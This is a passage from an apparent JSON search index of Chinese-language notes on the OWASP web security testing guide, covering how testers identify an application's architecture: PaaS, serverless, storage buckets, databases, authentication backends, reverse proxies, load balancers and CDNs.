<p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5e94\u7528\u7a0b\u5e8f\u663e\u793a\u4e24\u4e2a\u8bbf\u95ee\u70b9\uff08\u53c2\u6570<code>a</code>\u548c<code>b</code>\uff09\u3002\u5728\u8fd9\u4e2a\u9636\u6bb5\u627e\u5230\u7684\u6240\u6709\u8f93\u5165\u70b9\u4ee3\u8868\u4e00\u4e2a\u6d4b\u8bd5\u76ee\u6807\u3002\u8ddf\u8e2a\u5e94\u7528\u7a0b\u5e8f\u7684\u76ee\u5f55\u6216\u8c03\u7528\u6811\u4ee5\u53ca\u6240\u6709\u8bbf\u95ee\u70b9\u5728\u4e3b\u52a8\u6d4b\u8bd5\u671f\u95f4\u53ef\u80fd\u5f88\u6709\u7528\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1%5CWeb%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/#_7","title":"\u4e3b\u52a8\u6d4b\u8bd5","text":"<p>\u5728\u4e3b\u52a8\u6d4b\u8bd5\u671f\u95f4\uff0c\u6d4b\u8bd5\u4eba\u5458\u5f00\u59cb\u4f7f\u7528\u4ee5\u4e0b\u90e8\u5206\u4e2d\u63cf\u8ff0\u7684\u65b9\u6cd5\u3002</p> <p>\u4e3b\u52a8\u6d4b\u8bd5\u96c6\u5df2\u5206\u4e3a 12 \u7c7b\uff1a</p> <ul> <li>\u4fe1\u606f\u6536\u96c6</li> <li>\u914d\u7f6e\u90e8\u7f72\u7ba1\u7406\u6d4b\u8bd5</li> <li>\u8eab\u4efd\u7ba1\u7406\u6d4b\u8bd5</li> <li>\u8ba4\u8bc1\u6d4b\u8bd5</li> <li>\u6388\u6743\u6d4b\u8bd5</li> <li>\u4f1a\u8bdd\u7ba1\u7406\u6d4b\u8bd5</li> <li>\u8f93\u5165\u9a8c\u8bc1\u6d4b\u8bd5</li> <li>\u9519\u8bef\u5904\u7406</li> <li>\u5bc6\u7801\u5b66</li> <li>\u4e1a\u52a1\u903b\u8f91\u6d4b\u8bd5</li> <li>\u5ba2\u6237\u7aef\u6d4b\u8bd5</li> <li>API\u6d4b\u8bd5</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/API%E6%B5%8B%E8%AF%95/","title":"API\u6d4b\u8bd5","text":"<p>\u6d4b\u8bd5 GraphQL</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/","title":"Map \u5e94\u7528\u6846\u67b6","text":"<p>\u7f51\u9875</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_1","title":"\u6982\u62ec","text":"<p>\u4e3a\u4e86\u6709\u6548\u5730\u6d4b\u8bd5\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u80fd\u591f\u5c31\u5982\u4f55\u89e3\u51b3\u4efb\u4f55\u5df2\u8bc6\u522b\u7684\u95ee\u9898\u63d0\u4f9b\u6709\u610f\u4e49\u7684\u5efa\u8bae\uff0c\u4e86\u89e3\u60a8\u5b9e\u9645\u6d4b\u8bd5\u7684\u5185\u5bb9\u975e\u5e38\u91cd\u8981\u3002\u6b64\u5916\uff0c\u5b83\u8fd8\u53ef\u4ee5\u5e2e\u52a9\u786e\u5b9a\u662f\u5426\u5e94\u5c06\u7279\u5b9a\u7ec4\u4ef6\u89c6\u4e3a\u8d85\u51fa\u6d4b\u8bd5\u8303\u56f4\u3002</p> <p>\u73b0\u4ee3 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u590d\u6742\u6027\u53ef\u80fd\u6709\u5f88\u5927\u5dee\u5f02\uff0c\u4ece\u5728\u5355\u4e2a\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u7684\u7b80\u5355\u811a\u672c\u5230\u8de8\u6570\u5341\u79cd\u4e0d\u540c\u7cfb\u7edf\u3001\u8bed\u8a00\u548c\u7ec4\u4ef6\u7684\u9ad8\u5ea6\u590d\u6742\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u8fd8\u53ef\u80fd\u6709\u989d\u5916\u7684\u7f51\u7edc\u7ea7\u7ec4\u4ef6\uff0c\u4f8b\u5982\u9632\u706b\u5899\u6216\u5165\u4fb5\u4fdd\u62a4\u7cfb\u7edf\uff0c\u5b83\u4eec\u4f1a\u5bf9\u6d4b\u8bd5\u4ea7\u751f\u91cd\u5927\u5f71\u54cd\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u67b6\u6784\u548c\u4f7f\u7528\u7684\u6280\u672f\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>\u4ece\u9ed1\u76d2\u89d2\u5ea6\u8fdb\u884c\u6d4b\u8bd5\u65f6\uff0c\u91cd\u8981\u7684\u662f\u8981\u5c1d\u8bd5\u6e05\u695a\u5730\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u5de5\u4f5c\u65b9\u5f0f\uff0c\u4ee5\u53ca\u91c7\u7528\u4e86\u54ea\u4e9b\u6280\u672f\u548c\u7ec4\u4ef6\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u6d4b\u8bd5\u7279\u5b9a\u7ec4\u4ef6\uff08\u4f8b\u5982 Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\uff09\uff0c\u800c\u5176\u4ed6\u60c5\u51b5\u5219\u53ef\u4ee5\u901a\u8fc7\u68c0\u67e5\u5e94\u7528\u7a0b\u5e8f\u7684\u884c\u4e3a\u6765\u8bc6\u522b\u3002</p> <p>\u4ee5\u4e0b\u90e8\u5206\u63d0\u4f9b\u4e86\u5bf9\u5e38\u89c1\u67b6\u6784\u7ec4\u4ef6\u7684\u9ad8\u7ea7\u6982\u8ff0\uff0c\u4ee5\u53ca\u5982\u4f55\u8bc6\u522b\u5b83\u4eec\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_4","title":"\u5e94\u7528\u7ec4\u4ef6","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_5","title":"\u7f51\u7edc\u670d\u52a1\u5668","text":"<p>\u7b80\u5355\u7684\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u5728\u5355\u4e2a\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u7528\u6307\u5357\u7684\u6307\u7eb9 Web \u670d\u52a1\u5668\u90e8\u5206\u4e2d\u8ba8\u8bba\u7684\u6b65\u9aa4\u6765\u8bc6\u522b\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#paas","title":"\u5e73\u53f0\u5373\u670d\u52a1 (PaaS)","text":"<p>\u5728\u5e73\u53f0\u5373\u670d\u52a1 (PaaS) \u6a21\u578b\u4e2d\uff0cWeb \u670d\u52a1\u5668\u548c\u5e95\u5c42\u57fa\u7840\u8bbe\u65bd\u7531\u670d\u52a1\u63d0\u4f9b\u5546\u7ba1\u7406\uff0c\u5ba2\u6237\u53ea\u5bf9\u90e8\u7f72\u5728\u5176\u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f\u8d1f\u8d23\u3002\u4ece\u6d4b\u8bd5\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u6709\u4e24\u4e2a\u4e3b\u8981\u533a\u522b\uff1a</p> <ul> <li>\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\u65e0\u6743\u8bbf\u95ee\u5e95\u5c42\u57fa\u7840\u8bbe\u65bd\uff0c\u56e0\u6b64\u65e0\u6cd5\u76f4\u63a5\u4fee\u590d\u4efb\u4f55\u95ee\u9898\u3002</li> <li>\u57fa\u7840\u8bbe\u65bd\u6d4b\u8bd5\u5f88\u53ef\u80fd\u8d85\u51fa\u4efb\u4f55\u9879\u76ee\u7684\u8303\u56f4\u3002</li> </ul> <p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u8bc6\u522b PaaS \u7684\u4f7f\u7528\uff0c\u56e0\u4e3a\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f7f\u7528\u7279\u5b9a\u7684\u57df\u540d\uff08\u4f8b\u5982\uff0c\u90e8\u7f72\u5728 Azure App Services \u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f\u5c06\u6709\u4e00\u4e2a<code>*.azurewebsites.net</code>\u57df\u2014\u2014\u5c3d\u7ba1\u5b83\u4eec\u4e5f\u53ef\u80fd\u4f7f\u7528\u81ea\u5b9a\u4e49\u57df\uff09\u3002\u4f46\u662f\uff0c\u5728\u5176\u4ed6\u60c5\u51b5\u4e0b\uff0c\u5f88\u96be\u786e\u5b9a\u662f\u5426\u6b63\u5728\u4f7f\u7528 PaaS\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_6","title":"\u65e0\u670d\u52a1\u5668","text":"<p>\u5728\u65e0\u670d\u52a1\u5668\u6a21\u578b\u4e2d\uff0c\u5f00\u53d1\u4eba\u5458\u63d0\u4f9b\u76f4\u63a5\u5728\u6258\u7ba1\u5e73\u53f0\u4e0a\u4f5c\u4e3a\u72ec\u7acb\u529f\u80fd\u8fd0\u884c\u7684\u4ee3\u7801\uff0c\u800c\u4e0d\u662f\u4f5c\u4e3a\u90e8\u7f72\u5728 webroot \u4e2d\u7684\u4f20\u7edf\u5927\u578b Web \u5e94\u7528\u7a0b\u5e8f\u3002\u8fd9\u4f7f\u5f97\u5b83\u975e\u5e38\u9002\u5408\u57fa\u4e8e\u5fae\u670d\u52a1\u7684\u67b6\u6784\u3002\u4e0e PaaS \u73af\u5883\u4e00\u6837\uff0c\u57fa\u7840\u67b6\u6784\u6d4b\u8bd5\u53ef\u80fd\u8d85\u51fa\u8303\u56f4\u3002</p> <p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u80fd\u4f1a\u901a\u8fc7\u7279\u5b9a HTTP \u6807\u5934\u7684\u5b58\u5728\u6765\u6307\u793a\u65e0\u670d\u52a1\u5668\u4ee3\u7801\u7684\u4f7f\u7528\u3002\u4f8b\u5982\uff0cAWS Lambda \u51fd\u6570\u901a\u5e38\u4f1a\u8fd4\u56de\u4ee5\u4e0b\u6807\u5934\uff1a</p> <pre><code>X-Amz-Invocation-Type\nX-Amz-Log-Type\nX-Amz-Client-Context\n</code></pre> <p>Azure Functions \u4e0d\u592a\u660e\u663e\u3002\u5b83\u4eec\u901a\u5e38\u4f1a\u8fd4\u56de<code>Server: Kestrel</code>\u6807\u5934 - \u4f46\u8fd9\u672c\u8eab\u5e76\u4e0d\u8db3\u4ee5\u786e\u4fe1\u5b83\u662f\u4e00\u4e2a Azure \u5e94\u7528\u7a0b\u5e8f\u51fd\u6570\uff0c\u800c\u4e0d\u662f\u5728 Kestrel \u4e0a\u8fd0\u884c\u7684\u4e00\u4e9b\u5176\u4ed6\u4ee3\u7801\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_7","title":"\u5fae\u670d\u52a1","text":"<p>\u5728\u57fa\u4e8e\u5fae\u670d\u52a1\u7684\u67b6\u6784\u4e2d\uff0c\u5e94\u7528\u7a0b\u5e8f API \u7531\u591a\u4e2a\u79bb\u6563\u670d\u52a1\u7ec4\u6210\uff0c\u800c\u4e0d\u662f\u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53\u5e94\u7528\u7a0b\u5e8f\u8fd0\u884c\u3002\u670d\u52a1\u672c\u8eab\u901a\u5e38\u5728\u5bb9\u5668\u5185\u8fd0\u884c\uff08\u901a\u5e38\u4f7f\u7528 Kubernetes\uff09\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f7f\u7528\u5404\u79cd\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u8bed\u8a00\u3002\u5c3d\u7ba1\u5b83\u4eec\u901a\u5e38\u4f4d\u4e8e\u5355\u4e2a API \u7f51\u5173\u548c\u57df\u4e4b\u540e\uff0c\u4f46\u4f7f\u7528\u591a\u79cd\u8bed\u8a00\uff08\u901a\u5e38\u5728\u8be6\u7ec6\u7684\u9519\u8bef\u6d88\u606f\u4e2d\u6307\u51fa\uff09\u53ef\u80fd\u8868\u660e\u6b63\u5728\u4f7f\u7528\u5fae\u670d\u52a1\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_8","title":"\u9759\u6001\u5b58\u50a8","text":"<p>\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u5c06\u9759\u6001\u5185\u5bb9\u5b58\u50a8\u5728\u4e13\u7528\u5b58\u50a8\u5e73\u53f0\u4e0a\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u6258\u7ba1\u5728\u4e3b Web \u670d\u52a1\u5668\u4e0a\u3002\u4e24\u4e2a\u6700\u5e38\u89c1\u7684\u5e73\u53f0\u662f Amazon \u7684 S3 Buckets \u548c Azure \u7684 Storage Accounts\uff0c\u53ef\u4ee5\u901a\u8fc7\u57df\u540d\u8f7b\u677e\u8bc6\u522b\uff1a</p> <ul> <li>Amazon S3 \u5b58\u50a8\u6876\u662f<code>BUCKET.s3.amazonaws.com</code>\u6216<code>s3.REGION.amazonaws.com/BUCKET</code></li> <li>Azure \u5b58\u50a8\u5e10\u6237\u662f<code>ACCOUNT.blob.core.windows.net</code></li> </ul> <p>\u8fd9\u4e9b\u5b58\u50a8\u5e10\u6237\u901a\u5e38\u4f1a\u66b4\u9732\u654f\u611f\u6587\u4ef6\uff0c\u5982\u6d4b\u8bd5\u4e91\u5b58\u50a8\u6307\u5357\u90e8\u5206\u6240\u8ff0\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_9","title":"\u6570\u636e\u5e93","text":"<p>\u5927\u591a\u6570\u91cd\u8981\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u67d0\u79cd\u6570\u636e\u5e93\u6765\u5b58\u50a8\u52a8\u6001\u5185\u5bb9\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u786e\u5b9a\u6570\u636e\u5e93\uff0c\u5c3d\u7ba1\u5b83\u901a\u5e38\u4f9d\u8d56\u4e8e\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u5176\u4ed6\u95ee\u9898\u3002\u8fd9\u901a\u5e38\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u5b8c\u6210\uff1a</p> <ul> <li>\u7aef\u53e3\u626b\u63cf\u670d\u52a1\u5668\u5e76\u67e5\u627e\u4e0e\u7279\u5b9a\u6570\u636e\u5e93\u5173\u8054\u7684\u4efb\u4f55\u5f00\u653e\u7aef\u53e3\u3002</li> <li>\u89e6\u53d1\u4e0e SQL\uff08\u6216 NoSQL\uff09\u76f8\u5173\u7684\u9519\u8bef\u6d88\u606f\uff08\u6216\u4ece\u641c\u7d22\u5f15\u64ce\u4e2d\u67e5\u627e\u73b0\u6709\u9519\u8bef\u3002</li> </ul> <p>\u5982\u679c\u65e0\u6cd5\u6700\u7ec8\u786e\u5b9a\u6570\u636e\u5e93\uff0c\u60a8\u901a\u5e38\u53ef\u4ee5\u6839\u636e\u5e94\u7528\u7a0b\u5e8f\u7684\u5176\u4ed6\u65b9\u9762\u8fdb\u884c\u6709\u6839\u636e\u7684\u731c\u6d4b\uff1a</p> <ul> <li>Windows\u3001IIS \u548c ASP.NET \u7ecf\u5e38\u4f7f\u7528 Microsoft SQL \u670d\u52a1\u5668\u3002</li> <li>\u5d4c\u5165\u5f0f\u7cfb\u7edf\u901a\u5e38\u4f7f\u7528 SQLite\u3002</li> <li>PHP \u901a\u5e38\u4f7f\u7528 MySQL \u6216 PostgreSQL\u3002</li> <li>APEX \u7ecf\u5e38\u4f7f\u7528 Oracle\u3002</li> </ul> <p>\u8fd9\u4e9b\u4e0d\u662f\u786c\u6027\u89c4\u5b9a\uff0c\u4f46\u5982\u679c\u6ca1\u6709\u66f4\u597d\u7684\u4fe1\u606f\uff0c\u80af\u5b9a\u53ef\u4ee5\u4e3a\u60a8\u63d0\u4f9b\u4e00\u4e2a\u5408\u7406\u7684\u8d77\u70b9\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_10","title":"\u9a8c\u8bc1","text":"<p>\u5927\u591a\u6570\u5e94\u7528\u7a0b\u5e8f\u90fd\u6709\u67d0\u79cd\u5f62\u5f0f\u7684\u7528\u6237\u8eab\u4efd\u9a8c\u8bc1\u3002\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u8eab\u4efd\u9a8c\u8bc1\u540e\u7aef\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>Web \u670d\u52a1\u5668\u914d\u7f6e\uff08\u5305\u62ec<code>.htaccess</code>\u6587\u4ef6\uff09\u6216\u811a\u672c\u4e2d\u7684\u786c\u7f16\u7801\u5bc6\u7801\u3002<ul> <li>\u901a\u5e38\u663e\u793a\u4e3a HTTP \u57fa\u672c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u7531\u6d4f\u89c8\u5668\u4e2d\u7684\u5f39\u51fa\u7a97\u53e3\u548c<code>WWW-Authenticate: Basic</code>HTTP \u6807\u5934\u6307\u793a\u3002</li> </ul> </li> <li>\u6570\u636e\u5e93\u4e2d\u7684\u672c\u5730\u7528\u6237\u5e10\u6237\u3002<ul> <li>\u901a\u5e38\u96c6\u6210\u5230\u5e94\u7528\u7a0b\u5e8f\u7684\u8868\u5355\u6216 API \u7aef\u70b9\u4e2d\u3002</li> </ul> </li> <li>\u73b0\u6709\u7684\u4e2d\u592e\u8eab\u4efd\u9a8c\u8bc1\u6e90\uff0c\u4f8b\u5982 Active Directory \u6216 LDAP \u670d\u52a1\u5668\u3002<ul> <li>\u53ef\u4ee5\u4f7f\u7528 NTLM \u8eab\u4efd\u9a8c\u8bc1\uff0c\u7531<code>WWW-Authenticate: NTLM</code>HTTP \u6807\u5934\u6307\u793a\u3002</li> <li>\u53ef\u4ee5\u4ee5\u4e00\u79cd\u5f62\u5f0f\u96c6\u6210\u5230 Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\u3002</li> <li>\u53ef\u80fd\u9700\u8981\u4ee5\u201cDOMAIN\\username\u201d\u683c\u5f0f\u8f93\u5165\u7528\u6237\u540d\uff0c\u6216\u8005\u53ef\u80fd\u4f1a\u63d0\u4f9b\u53ef\u7528\u57df\u7684\u4e0b\u62c9\u5217\u8868\u3002</li> </ul> </li> <li>\u4e0e\u5185\u90e8\u6216\u5916\u90e8\u63d0\u4f9b\u5546\u7684\u5355\u70b9\u767b\u5f55 (SSO)\u3002<ul> <li>\u901a\u5e38\u4f7f\u7528 OAuth\u3001OpenID Connect \u6216 SAML\u3002</li> </ul> </li> </ul> <p>\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u4e3a\u7528\u6237\u63d0\u4f9b\u591a\u79cd\u8eab\u4efd\u9a8c\u8bc1\u9009\u9879\uff08\u4f8b\u5982\u6ce8\u518c\u672c\u5730\u5e10\u6237\u6216\u4f7f\u7528\u4ed6\u4eec\u73b0\u6709\u7684 Facebook \u5e10\u6237\uff09\uff0c\u5e76\u4e14\u53ef\u80fd\u4f1a\u4e3a\u666e\u901a\u7528\u6237\u548c\u7ba1\u7406\u5458\u4f7f\u7528\u4e0d\u540c\u7684\u673a\u5236\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#api","title":"\u7b2c\u4e09\u65b9\u670d\u52a1\u548c API","text":"<p>\u51e0\u4e4e\u6240\u6709 Web \u5e94\u7528\u7a0b\u5e8f\u90fd\u5305\u542b\u7531\u5ba2\u6237\u7aef\u52a0\u8f7d\u6216\u4e0e\u4e4b\u4ea4\u4e92\u7684\u7b2c\u4e09\u65b9\u8d44\u6e90\u3002\u8fd9\u4e9b\u53ef\u4ee5\u5305\u62ec\uff1a</p> <ul> <li>\u6d3b\u52a8\u5185\u5bb9\uff08\u4f8b\u5982\u811a\u672c\u3001\u6837\u5f0f\u8868\u3001\u5b57\u4f53\u548c iframe\uff09\u3002</li> <li>\u88ab\u52a8\u5185\u5bb9\uff08\u4f8b\u5982\u56fe\u50cf\u548c\u89c6\u9891\uff09\u3002</li> <li>\u5916\u90e8 API\u3002</li> <li>\u793e\u4ea4\u5a92\u4f53\u6309\u94ae\u3002</li> <li>\u5e7f\u544a\u7f51\u7edc\u3002</li> <li>\u652f\u4ed8\u7f51\u5173\u3002</li> </ul> <p>\u8fd9\u4e9b\u8d44\u6e90\u76f4\u63a5\u7531\u7528\u6237\u7684\u6d4f\u89c8\u5668\u8bf7\u6c42\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528\u5f00\u53d1\u4eba\u5458\u5de5\u5177\u6216\u62e6\u622a\u4ee3\u7406\u8f7b\u677e\u8bc6\u522b\u3002\u867d\u7136\u8bc6\u522b\u5b83\u4eec\u5f88\u91cd\u8981\uff08\u56e0\u4e3a\u5b83\u4eec\u4f1a\u5f71\u54cd\u5e94\u7528\u7a0b\u5e8f\u7684\u5b89\u5168\u6027\uff09\uff0c\u4f46\u8bf7\u8bb0\u4f4f_\u5b83\u4eec\u901a\u5e38\u4e0d\u5728\u6d4b\u8bd5\u8303\u56f4\u5185_\uff0c\u56e0\u4e3a\u5b83\u4eec\u5c5e\u4e8e\u7b2c\u4e09\u65b9\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_11","title":"\u7f51\u7edc\u7ec4\u4ef6","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_12","title":"\u53cd\u5411\u4ee3\u7406","text":"<p>\u53cd\u5411\u4ee3\u7406\u4f4d\u4e8e\u4e00\u4e2a\u6216\u591a\u4e2a\u540e\u7aef\u670d\u52a1\u5668\u4e4b\u524d\uff0c\u5e76\u5c06\u8bf7\u6c42\u91cd\u5b9a\u5411\u5230\u9002\u5f53\u7684\u76ee\u7684\u5730\u3002\u5b83\u4eec\u53ef\u4ee5\u5b9e\u73b0\u5404\u79cd\u529f\u80fd\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>\u5145\u5f53\u8d1f\u8f7d\u5e73\u8861\u5668\u6216Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\u3002</li> <li>\u5141\u8bb8\u591a\u4e2a\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u5355\u4e2a IP \u5730\u5740\u6216\u57df\uff08\u5728\u5b50\u6587\u4ef6\u5939\u4e2d\uff09\u3002</li> <li>\u5b9e\u65bd IP \u8fc7\u6ee4\u6216\u5176\u4ed6\u9650\u5236\u3002</li> <li>\u4ece\u540e\u7aef\u7f13\u5b58\u5185\u5bb9\u4ee5\u63d0\u9ad8\u6027\u80fd\u3002</li> </ul> <p>\u5e76\u975e\u603b\u80fd\u68c0\u6d4b\u5230\u53cd\u5411\u4ee3\u7406\uff08\u7279\u522b\u662f\u5982\u679c\u5b83\u540e\u9762\u53ea\u6709\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff09\uff0c\u4f46\u6709\u65f6\u60a8\u901a\u5e38\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u8bc6\u522b\u5b83\uff1a</p> <ul> <li>\u524d\u7aef\u670d\u52a1\u5668\u548c\u540e\u7aef\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u7684\u4e0d\u5339\u914d\uff08\u4f8b\u5982<code>Server: nginx</code>\u5e26\u6709 ASP.NET \u5e94\u7528\u7a0b\u5e8f\u7684\u6807\u5934\uff09\u3002<ul> <li>\u8fd9\u6709\u65f6\u4f1a\u5bfc\u81f4\u8bf7\u6c42\u8d70\u79c1\u6f0f\u6d1e\u3002</li> </ul> </li> <li>\u91cd\u590d\u7684\u6807\u5934\uff08\u5c24\u5176\u662f<code>Server</code>\u6807\u5934\uff09\u3002</li> <li>\u5728\u540c\u4e00 IP \u5730\u5740\u6216\u57df\u4e0a\u6258\u7ba1\u591a\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff08\u5c24\u5176\u662f\u5f53\u5b83\u4eec\u4f7f\u7528\u4e0d\u540c\u8bed\u8a00\u65f6\uff09\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_13","title":"\u8d1f\u8f7d\u5747\u8861\u5668","text":"<p>\u8d1f\u8f7d\u5747\u8861\u5668\u4f4d\u4e8e\u591a\u4e2a\u540e\u7aef\u670d\u52a1\u5668\u4e4b\u524d\uff0c\u5e76\u5728\u5b83\u4eec\u4e4b\u95f4\u5206\u914d\u8bf7\u6c42\uff0c\u4ee5\u4fbf\u4e3a\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u66f4\u5927\u7684\u5197\u4f59\u548c\u5904\u7406\u80fd\u529b\u3002</p> <p>\u8d1f\u8f7d\u5747\u8861\u5668\u53ef\u80fd\u96be\u4ee5\u68c0\u6d4b\uff0c\u4f46\u6709\u65f6\u53ef\u4ee5\u901a\u8fc7\u53d1\u51fa\u591a\u4e2a\u8bf7\u6c42\u5e76\u68c0\u67e5\u54cd\u5e94\u7684\u5dee\u5f02\u6765\u8bc6\u522b\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>\u7cfb\u7edf\u65f6\u95f4\u4e0d\u4e00\u81f4\u3002</li> <li>\u8be6\u7ec6\u9519\u8bef\u6d88\u606f\u4e2d\u7684\u4e0d\u540c\u5185\u90e8 IP \u5730\u5740\u6216\u4e3b\u673a\u540d\u3002</li> <li>\u4ece\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020 (SSRF)\u8fd4\u56de\u7684\u4e0d\u540c\u5730\u5740\u3002</li> </ul> <p>\u5b83\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7279\u5b9a cookie \u7684\u5b58\u5728\u6765\u6307\u793a\uff08\u4f8b\u5982\uff0cF5 BIG-IP \u8d1f\u8f7d\u5e73\u8861\u5668\u5c06\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a<code>BIGipServer</code>.</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#cdn","title":"\u5185\u5bb9\u5206\u53d1\u7f51\u7edc (CDN)","text":"<p>\u5185\u5bb9\u5206\u53d1\u7f51\u7edc (CDN) 